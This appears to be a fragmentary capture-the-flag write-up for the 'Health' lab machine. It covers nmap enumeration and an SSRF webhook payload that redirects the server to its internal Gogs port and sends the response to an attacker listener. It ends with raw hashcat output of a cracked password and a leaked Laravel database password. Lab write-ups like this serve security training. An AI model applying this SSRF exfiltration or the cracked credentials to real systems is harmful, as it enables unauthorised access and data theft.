# Health

---

## Setup

Spawned in the machine as always, got the IP and stored it in an environment variable in case I lose it -as always-

```bash
$ export IP=10.10.11.176
$ echo $IP
10.10.11.176
```

and to make sure everything is working alright and the target machine is up and running, we can use `ping` to make sure it's alive.

```bash
$ ping $IP
PING 10.10.11.176 (10.10.11.176) 56(84) bytes of data.
64 bytes from 10.10.11.176: icmp_seq=1 ttl=63 time=69.3 ms
64 bytes from 10.10.11.176: icmp_seq=2 ttl=63 time=68.1 ms
64 bytes from 10.10.11.176: icmp_seq=3 ttl=63 time=67.9 ms
64 bytes from 10.10.11.176: icmp_seq=4 ttl=63 time=70.4 ms
```

---

## Enumeration

Started with an [nmap](http://nmap.org) scan using the following flags:

`-sV`: Determine running services/versions on open ports
`-sC`: Run default scripts
`-v`: Verbose output
`-oN`: Write the output of the scan into a file

```shell
nmap -sV -sC -v -oN scan.nmap $IP
```

Scan result:

```sh
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 32b7f4d42f45d330ee123b0367bbe631 (RSA)
|   256 86e15d8c2939acd7e815e649e235ed0c (ECDSA)
|_  256 ef6bad64d5e45b3e667949f4ec4c239f (ED25519)
80/tcp   open     http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: HTTP Monitoring Tool
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
3000/tcp filtered ppp

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

IDEA:
Application is a webhook, so we redirect the server request to its own localhost port 3000 and link that webhook to a listener

```json
{
  "webhookUrl": "http://10.10.16.68:4444",
  "monitoredUrl": "http://10.10.16.68/",
  "health": "up",
  "body": "<!DOCTYPE html>\n<html>\n\t<head data-suburl=\"\">\n\t\t<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" />\n        <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\"/>\n        <meta name=\"author\" content=\"Gogs - Go Git Service\" />\n\t\t<meta name=\"description\" content=\"Gogs(Go Git Service) a painless self-hosted Git Service written in Go\" />\n\t\t<meta name=\"keywords\" content=\"go, git, self-hosted, gogs\">\n\t\t<meta name=\"_csrf\" content=\"19dYQ6pB8zlGMRVQ9PG_xpt6ZQ46MTY2NjkxMDg3MTUxMDk3MDYzOQ==\" />\n\t\t\n\n\t\t<link rel=\"shortcut icon\" href=\"/img/favicon.png\" />\n\n\t\t\n\t\t<link rel=\"stylesheet\" href=\"//maxcdn.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.min.css\">\n\n\t\t<script src=\"//code.jquery.com/jquery-1.11.1.min.js\"></script>\n\t\t\n\t\t\n\t\t<link rel=\"stylesheet\" href=\"/ng/css/ui.css\">\n\t\t<link rel=\"stylesheet\" href=\"/ng/css/gogs.css\">\n\t\t<link rel=\"stylesheet\" href=\"/ng/css/tipsy.css\">\n\t\t<link rel=\"stylesheet\" href=\"/ng/css/magnific-popup.css\">\n\t\t<link rel=\"stylesheet\" href=\"/ng/fonts/octicons.css\">\n\t\t<link rel=\"stylesheet\" href=\"/css/github.min.css\">\n\n\t\t\n    \t<script src=\"/ng/js/lib/lib.js\"></script>\n    \t<script src=\"/ng/js/lib/jquery.tipsy.js\"></script>\n    \t<script src=\"/ng/js/lib/jquery.magnific-popup.min.js\"></script>\n        <script src=\"/ng/js/utils/tabs.js\"></script>\n        <script src=\"/ng/js/utils/preview.js\"></script>\n\t\t<script src=\"/ng/js/gogs.js\"></script>\n\n\t\t<title>Gogs: Go Git Service</title>\n\t</head>\n\t<body>\n\t\t<div id=\"wrapper\">\n\t\t<noscript>Please enable JavaScript in your browser!</noscript>\n\n<header id=\"header\">\n    <ul class=\"menu menu-line container\" id=\"header-nav\">\n        \n\n        \n            \n            <li class=\"right\" id=\"header-nav-help\">\n                <a target=\"_blank\" href=\"http://gogs.io/docs\"><i class=\"octicon octicon-info\"></i>&nbsp;&nbsp;Help</a>\n            </li>\n            <li class=\"right\" id=\"header-nav-explore\">\n                <a href=\"/explore\"><i class=\"octicon octicon-globe\"></i>&nbsp;&nbsp;Explore</a>\n            </li>\n            \n        \n    </ul>\n</header>\n<div id=\"promo-wrapper\">\n    <div class=\"container clear\">\n        <div id=\"promo-logo\" class=\"left\">\n            <img src=\"/img/gogs-lg.png\" alt=\"logo\" />\n        </div>\n        <div id=\"promo-content\">\n            <h1>Gogs</h1>\n            <h2>A painless self-hosted Git service written in Go</h2>\n            <form id=\"promo-form\" action=\"/user/login\" method=\"post\">\n                <input type=\"hidden\" name=\"_csrf\" value=\"19dYQ6pB8zlGMRVQ9PG_xpt6ZQ46MTY2NjkxMDg3MTUxMDk3MDYzOQ==\">\n                <input class=\"ipt ipt-large\" id=\"username\" name=\"uname\" type=\"text\" placeholder=\"Username or E-mail\"/>\n                <input class=\"ipt ipt-large\" name=\"password\" type=\"password\" placeholder=\"Password\"/>\n                <input name=\"from\" type=\"hidden\" value=\"home\">\n                <button class=\"btn btn-black btn-large\">Sign In</button>\n                <button class=\"btn btn-green btn-large\" id=\"register-button\">Register</button>\n            </form>\n            <div id=\"promo-social\" class=\"social-buttons\">\n                \n\n\n\n            </div>\n        </div>&nbsp;\n    </div>\n</div>\n<div id=\"feature-wrapper\">\n    <div class=\"container clear\">\n        \n        <div class=\"grid-1-2 left\">\n            <i class=\"octicon octicon-flame\"></i>\n            <b>Easy to install</b>\n            <p>Simply <a target=\"_blank\" href=\"http://gogs.io/docs/installation/install_from_binary.html\">run the binary</a> for your platform. Or ship Gogs with <a target=\"_blank\" href=\"https://github.com/gogits/gogs/tree/master/dockerfiles\">Docker</a> or <a target=\"_blank\" href=\"https://github.com/geerlingguy/ansible-vagrant-examples/tree/master/gogs\">Vagrant</a>, or get it <a target=\"_blank\" href=\"http://gogs.io/docs/installation/install_from_packages.html\">packaged</a>.</p>\n        </div>\n        <div class=\"grid-1-2 left\">\n            <i class=\"octicon octicon-device-desktop\"></i>\n            <b>Cross-platform</b>\n            <p>Gogs runs anywhere <a target=\"_blank\" href=\"http://golang.org/\">Go</a> can compile for: Windows, Mac OS X, Linux, ARM, etc. Choose the one you love!</p>\n        </div>\n        <div class=\"grid-1-2 left\">\n            <i class=\"octicon octicon-rocket\"></i>\n            <b>Lightweight</b>\n            <p>Gogs has low minimal requirements and can run on an inexpensive Raspberry Pi. Save your machine energy!</p>\n        </div>\n        <div class=\"grid-1-2 left\">\n            <i class=\"octicon octicon-code\"></i>\n            <b>Open Source</b>\n            <p>It's all on <a target=\"_blank\" href=\"https://github.com/gogits/gogs/\">GitHub</a>! Join us by contributing to make this project even better. Don't be shy to be a contributor!</p>\n        </div>\n        \n    </div>\n</div>\n\t\t</div>\n\t\t<footer id=\"footer\">\n\t\t    <div class=\"container clear\">\n\t\t        <p class=\"left\" id=\"footer-rights\">© 2014 GoGits · Version: 0.5.5.1010 Beta · Page: <strong>1ms</strong> ·\n\t\t            Template: <strong>1ms</strong></p>\n\n\t\t        <div class=\"right\" id=\"footer-links\">\n\t\t            <a target=\"_blank\" href=\"https://github.com/gogits/gogs\"><i class=\"fa fa-github-square\"></i></a>\n\t\t            <a target=\"_blank\" href=\"https://twitter.com/gogitservice\"><i class=\"fa fa-twitter\"></i></a>\n\t\t            <a target=\"_blank\" href=\"https://plus.google.com/communities/115599856376145964459\"><i class=\"fa fa-google-plus\"></i></a>\n\t\t            <a target=\"_blank\" href=\"http://weibo.com/gogschina\"><i class=\"fa fa-weibo\"></i></a>\n\t\t            <div id=\"footer-lang\" class=\"inline drop drop-top\">Language\n\t\t                <div class=\"drop-down\">\n\t\t                    <ul class=\"menu menu-vertical switching-list\">\n\t\t                    \t\n\t\t                        <li><a href=\"#\">English</a></li>\n\t\t                        \n\t\t                        <li><a href=\"/?lang=zh-CN\">简体中文</a></li>\n\t\t                        \n\t\t                        <li><a href=\"/?lang=zh-HK\">繁體中文</a></li>\n\t\t                        \n\t\t                        <li><a href=\"/?lang=de-DE\">Deutsch</a></li>\n\t\t                        \n\t\t                        <li><a href=\"/?lang=fr-CA\">Français</a></li>\n\t\t                        \n\t\t                        <li><a href=\"/?lang=nl-NL\">Nederlands</a></li>\n\t\t                        \n\t\t                    </ul>\n\t\t                </div>\n\t\t            </div>\n\t\t            <a target=\"_blank\" href=\"http://gogs.io\">Website</a>\n\t\t            <span class=\"version\">Go1.3.2</span>\n\t\t        </div>\n\t\t    </div>\n\t\t</footer>\n\t</body>\n</html>",
  "message": "HTTP/1.0 302 Found",
  "headers": {
    "Server": "BaseHTTP/0.6 Python/3.10.7",
    "Date": "Thu, 27 Oct 2022 22:47:51 GMT",
    "Location": "http://127.0.0.1:3000",
    "Content-Type": "text/html; charset=UTF-8",
    "Set-Cookie": "_csrf=; Path=/; Max-Age=0"
  }
}
```

sha256:10000:c08zWEliZVcxNA:ZsB0ZFVFeB8QZPt/0Rd0U9uPDKLOWKnYHAS+Lm07oqDWwDLw/U74P0jXQ0nsGW9O/jc=:february15
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 10900 (PBKDF2-HMAC-SHA256)
Hash.Target......: sha256:10000:c08zWEliZVcxNA:ZsB0ZFVFeB8QZPt/0Rd0U9u...9O/jc=
Time.Started.....: Thu Oct 27 19:32:20 2022, (1 min, 28 secs)
Time.Estimated...: Thu Oct 27 19:33:48 2022, (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      808 H/s (7.29ms) @ Accel:32 Loops:1024 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 70976/14344385 (0.49%)
Rejected.........: 0/70976 (0.00%)
Restore.Point....: 70912/14344385 (0.49%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:9216-9999
Candidate.Engine.: Device Generator
Candidates.#1....: fullysick -> faith9
Hardware.Mon.#1..: Util: 96%

DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=laravel
DB_USERNAME=laravel
DB_PASSWORD=MYsql_strongestpass@2014+